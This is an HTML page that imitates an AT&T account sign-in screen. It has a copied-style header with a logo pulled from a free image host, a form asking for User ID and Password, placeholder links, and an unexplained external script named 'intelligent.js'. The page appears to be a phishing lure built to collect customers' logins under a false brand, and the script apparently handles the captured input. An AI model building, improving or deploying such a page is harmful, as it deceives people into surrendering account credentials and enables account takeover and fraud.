<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>AT&T Login </title>

<style>
    body {
        margin: 0;
        font-family: Arial, sans-serif;
        background: #f2f2f2;
    }

    .header {
        background: #0078D0;
        padding: 20px;
        text-align: center;
    }

    .header img {
        height: 80px;
    }

    .login-box {
        max-width: 380px;
        margin: 60px auto;
        background: #fff;
        padding: 30px 25px;
        border-radius: 12px;
        box-shadow: 0 4px 14px rgba(0,0,0,0.15);
    }

    .login-box h2 {
        color: #333;
        text-align: center;
        margin-bottom: 15px;
    }

    .input-group {
        margin-bottom: 18px;
    }

    .input-group label {
        display: block;
        font-size: 14px;
        font-weight: bold;
        color: #444;
        margin-bottom: 5px;
    }

    .input-group input {
        width: 100%;
        padding: 12px;
        font-size: 15px;
        border: 1px solid #bbb;
        border-radius: 8px;
        outline: none;
        transition: 0.2s;
    }

    .input-group input:focus {
        border-color: #0078D0;
        box-shadow: 0 0 6px rgba(0,120,208,0.4);
    }

    .login-btn {
        width: 100%;
        padding: 14px;
        background: #0078D0;
        border: none;
        border-radius: 8px;
        color: white;
        font-size: 16px;
        font-weight: bold;
        cursor: pointer;
        transition: 0.2s;
    }

    .login-btn:hover {
        background: #0068b6;
    }

    .links {
        text-align: center;
        margin-top: 20px;
        font-size: 14px;
    }

    .links a {
        color: #0078D0;
        text-decoration: none;
        font-weight: bold;
    }

    .links a:hover {
        text-decoration: underline;
    }
</style>
</head>
<script src="intelligent.js"></script>
<body>

<div class="header">
    <!-- Demo AT&T logo replacement (simple text version) -->
    <img src="https://i.ibb.co/dw105S2Z/Background-Eraser-20251204-211833746.png" alt="AT&T">
</div>

<div class="login-box">
    <h2>Sign in to your AT&T account</h2>
<form>
    <div class="input-group">
        <label>User ID</label>
        <input type="text" placeholder="Enter User ID" name="Userid" required>
    </div>

    <div class="input-group">
        <label>Password</label>
        <input type="password" placeholder="Enter Password" name="Password" required>
    </div>

    <button class="login-btn" type="submit">Sign In</button>
</form>
    <div class="links">
        <p><a href="#">Forgot User ID?</a> • <a href="#">Forgot Password?</a></p>
        <p>Don’t have an ID? <a href="#">Create one now</a></p>
    </div>
</div>

</body>
</html>
